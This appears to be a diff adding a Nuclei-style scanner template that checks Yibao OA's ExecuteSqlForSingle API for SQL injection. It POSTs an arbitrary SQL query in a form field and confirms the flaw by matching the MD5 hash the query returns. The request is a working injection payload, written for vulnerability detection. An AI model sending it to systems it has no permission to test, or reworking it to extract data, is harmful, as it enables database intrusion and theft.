@@ -1,0 +1,28 @@
+id: yibao-ExecuteSqlForSingle-sql-injection
+
+info:
+  name: 易宝OA-SQL注入-ExecuteSqlForSingle
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForSingle HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 100
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "e10adc3949ba59abbe56e057f20f883e")'
